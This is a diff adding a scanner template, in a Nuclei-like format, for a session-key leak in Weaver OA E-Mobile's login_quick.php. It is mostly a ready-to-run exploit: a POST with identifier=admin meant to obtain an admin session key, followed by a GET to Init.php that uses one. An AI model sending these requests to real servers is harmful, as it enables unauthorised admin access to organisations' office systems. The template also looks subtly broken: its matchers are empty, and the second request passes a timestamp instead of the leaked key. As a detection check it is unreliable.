@@ -1,0 +1,23 @@
+id: weaver-login-sessionkey
+brief:
+    title: OA E-Mobile login_quick.php - Login SessionKey
+    by: SleepingBag945
+    level: high
+    about: login_quick.php in OA E-Mobile leaks session key.
+    label:
+        - weaver
+        - e-mobile
+        - oa
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/E-mobile/App/System/Login/login_quick.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: identifier=admin
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/E-mobile/App/Init.php?m=all_Create&detailid=&fromid=&sessionkey={{timestamp}}'
+      signs: []
